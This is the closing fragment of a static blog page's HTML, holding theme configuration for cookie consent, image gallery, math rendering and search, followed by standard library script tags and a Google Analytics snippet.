æ¥æ”¹å–„æ‚¨çš„æµè§ˆä½“éªŒ."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":null,"findAllMatches":null,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":null,"ignoreLocation":null,"isCaseSensitive":null,"location":null,"maxResultLength":10,"minMatchCharLength":null,"noResultsFound":"æ²¡æœ‰æ‰¾åˆ°ç»“æœ","snippetLength":50,"threshold":null,"type":"fuse","useExtendedSearch":null},"sharerjs":true};</script><script type="text/javascript" src="/lib/gitalk/gitalk.min.js"></script><script type="text/javascript" src="/js/gitalk.min.js" defer></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js" defer></script><script type="text/javascript" src="/lib/katex/auto-render.min.js" defer></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js" defer></script><script type="text/javascript" src="/lib/katex/mhchem.min.js" defer></script><script type="text/javascript" src="/js/katex.min.js" defer></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script type="text/javascript" src="/js/cookieconsent.min.js" defer></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript">
            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
            gtag('config', 'G-Z392YPQYYV', { 'anonymize_ip': true });
        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-Z392YPQYYV" async></script></div>
</body>

</html>